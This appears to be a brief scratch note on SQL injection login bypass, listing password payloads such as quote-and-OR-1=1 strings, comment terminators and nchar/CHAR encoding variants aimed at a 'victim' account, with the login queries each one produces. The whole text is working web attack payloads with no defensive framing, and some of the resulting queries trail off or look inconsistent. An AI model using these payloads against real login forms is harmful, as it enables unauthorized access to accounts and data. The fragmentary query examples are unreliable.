username=victim
password=\' or 1=1 --

query something like

select * from users where username = 'username' and password = 'password'

so adding ' makes it
... and password = '' or '1=1'

and password = ''' or ''1=1'

and password = '\'' or 

nchar(0x02BB) or nchar(0x02BB)1=1

CHAR(0x276f72202731)

\'or 1;#

creates:

and password='\'' or 1 #'
